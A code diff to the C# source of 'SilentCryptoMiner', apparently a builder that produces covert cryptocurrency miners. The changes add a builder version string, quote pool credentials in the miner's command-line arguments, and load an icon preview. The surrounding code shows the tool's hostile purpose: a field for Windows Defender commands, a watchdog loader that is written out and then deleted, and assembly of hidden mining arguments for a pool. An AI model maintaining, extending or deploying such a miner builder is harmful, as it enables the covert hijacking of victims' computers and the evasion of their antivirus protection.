@@ -61,6 +61,8 @@ namespace SilentCryptoMiner
 
         public string defenderCommands;
 
+        public string builderVersion = "2.3.2";
+
         private void Form1_Load(object sender, EventArgs e)
         {
             cFormAO.Items.Add(FormAO);
@@ -73,6 +75,7 @@ namespace SilentCryptoMiner
             randomiCache.Add("SilentCryptoMiner");
             eid = Randomi(1);
             xid = Randomi(1);
+            formBuilder.Text += $" {builderVersion}";
         }
 
         private void btnBuild_Click(object sender, EventArgs e)
@@ -152,7 +155,7 @@ namespace SilentCryptoMiner
 
                     if (xmr)
                     {
-                        argstr.Append($"--algo={Invoke(new Func<string>(() => miner.comboAlgorithm.Text))} {(miner.chkAdvParam.Checked ? miner.txtAdvParam.Text : advancedParamsXMR)} --url={miner.txtPoolURL.Text} --user={miner.txtPoolUsername.Text} --pass={miner.txtPoolPassword.Text} --cpu-max-threads-hint={Invoke(new Func<string>(() => miner.comboMaxCPU.Text.Replace("%", "")))}");
+                        argstr.Append($"--algo={Invoke(new Func<string>(() => miner.comboAlgorithm.Text))} {(miner.chkAdvParam.Checked ? miner.txtAdvParam.Text : advancedParamsXMR)} --url={miner.txtPoolURL.Text} --user=\"{miner.txtPoolUsername.Text}\" --pass=\"{miner.txtPoolPassword.Text}\" --cpu-max-threads-hint={Invoke(new Func<string>(() => miner.comboMaxCPU.Text.Replace("%", "")))}");
                     }
                     else
                     {
@@ -177,6 +180,11 @@ namespace SilentCryptoMiner
                     if (miner.chkAPI.Checked && miner.txtAPI.Text.Length > 0)
                     {
                         argstr.Append($" --cinit-api=\"{miner.txtAPI.Text}\"");
+                    }
+
+                    if (!miner.txtAdvParam.Text.Contains("--cinit-version"))
+                    {
+                        argstr.Append($" --cinit-version=\"{builderVersion}\"");
                     }
 
                     if (xmr)
@@ -247,7 +255,7 @@ namespace SilentCryptoMiner
                                     }
 
                                     watchdogdata = File.ReadAllBytes(watchdogpath + "-loader.exe");
-                                    File.Delete(watchdogpath + "-loader.exe");                                   
+                                    File.Delete(watchdogpath + "-loader.exe");
                                 }
                                 else
                                 {
@@ -690,6 +698,14 @@ namespace SilentCryptoMiner
                     FormSerializer.Deserialise(this, loadpath);
                     FormAO = (AdvancedOptions)cFormAO.Items[0];
                     ReloadMinerList();
+                    try
+                    {
+                        if (File.Exists(txtIconPath.Text))
+                        {
+                            picIcon.ImageLocation = txtIconPath.Text;
+                        }
+                    }
+                    catch { }
                 } 
                 catch {
                     MessageBox.Show("Could not parse the configuration file..", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
